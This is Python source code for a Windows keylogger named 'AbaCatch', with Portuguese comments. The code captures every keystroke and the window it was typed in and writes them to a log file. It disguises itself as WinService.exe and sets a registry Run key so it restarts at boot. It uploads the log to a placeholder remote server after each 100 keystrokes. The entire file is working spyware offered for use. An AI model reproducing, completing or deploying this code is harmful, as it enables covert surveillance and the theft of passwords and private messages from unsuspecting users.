#!/usr/bin/python
# -*-coding:utf-8-*-
# coder: _carlosnericorreia_
# email: hackerama@protonmail.com
# AbaCatch Windows Kelogger v1.0

import pyHook
import pythoncom
import os
import subprocess
import requests
import threading
import platform
import time


def onkey(event):
    # funcao qee será chamada pelo 'hook_manager' toda vez que uma tecla for pressionada.
    global head
    global data
    global window
    global dump
    global ldir

    file = open(ldir + '\capt-' + pcname + '.txt', 'a')

    if event.WindowName != window:
        window = event.WindowName
        head = '\n\n[+] ' + window + ' - ' + date + '\n\n'
        file.write(head)

    if event.Ascii == 13:
        data = ' <ENTER>\n'
        file.write(data)
    elif event.Ascii == 8:
        data = ' <BACK SPACE> '
        file.write(data)
    elif event.Ascii == 9:
        data = ' <TAB>'
        file.write(data)
    else:
        data = chr(event.Ascii)
        file.write(data)
        file.close()

    dump.append(data)

    if len(dump) > 100:
            # print ('tamanho de dump:', len(dump))
            t = threading.Thread(target=upload, args=(fileup,))
            t.daemon = True
            t.start()
            dump = []
    return dump


def upload(fileup):
    # função responsável pelo upload do arquivo de log para o servidor.

    global urlUpload
    if os.path.exists(fileup):
            files = {'file': open(fileup, 'rb')}
            requests.post(urlUpload, files=files)


def persis():
    # função responsável pela persistência, ela cria a pasta '%appdata%/Winservice'; copia o arquivo para lá
    # e adiciona ao 'Run' (startup) no registro.

    global ldir
    try:
        # conv = os.path.realpath(__file__).replace('.py', '.exe')
        conv2 = ldir + '\WinService.exe'
        subprocess.call('COPY WinService.exe ' + ldir, shell=True)
        subprocess.call(
          'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WinService" /t REG_SZ /F /D ' + conv2,
          shell=True
         )
    except:
        pass


def main():

    try:
        os.mkdir(ldir)

    except Exception as e:
        print 'Exceção:', e
        pass

    persis()

    file = open(ldir + '\capt-' + pcname + '.txt', 'a')
    file.write('\n[+]'+('-'*64+'[+]\n'))
    file.write('   AbaCatch Keylogger v1.0\nOra, _Ora parece que temos um xeroque rolmes aqui_\n\n')
    file.write('   DATA E HORA: ' + date + '\n')
    file.write('   NOME DO USUARIO: ' + pcname + '\n')
    file.write('   SISTEMA OPERACIONAL: ' + pcos + '\n')
    file.write('   PROCESSADOR: ' + pcprocess + '\n')
    file.write('[+]' + ('-'*64 + '[+]\n'))
    file.close()

    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = onkey
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


urlUpload = "https://SEUSERVIDORWEB/upload.php"
ldir = 'C:\Users\Usuario\AppData\Roaming\WinService'
window = None
data = ''
head = ''
dump = []
date = time.strftime("%d/%m/%Y") + ' - ' + time.strftime("%X")
pcname = platform.node()
pcos = platform.platform()
pcprocess = platform.processor()
fileup = ldir + '\capt-' + pcname + '.txt'

if __name__ == "__main__":
    main()
